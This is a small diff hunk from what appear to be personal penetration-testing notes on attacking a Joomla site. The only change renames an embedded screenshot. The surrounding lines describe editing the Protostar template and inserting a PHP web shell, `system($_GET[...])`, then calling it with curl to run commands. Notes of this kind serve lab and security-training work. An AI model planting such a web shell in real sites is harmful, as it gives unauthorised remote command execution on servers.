@@ -38,7 +38,7 @@ During the Joomla enumeration phase and the general research hunting for company
 ```bash
 # Going to the TEMPLATES -> Configuration
 ```
-![[Pasted image 20260930212116.png]]
+![[Drapal.png]]
 Under the template column then using that Protstar.
 `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`
 Then curling
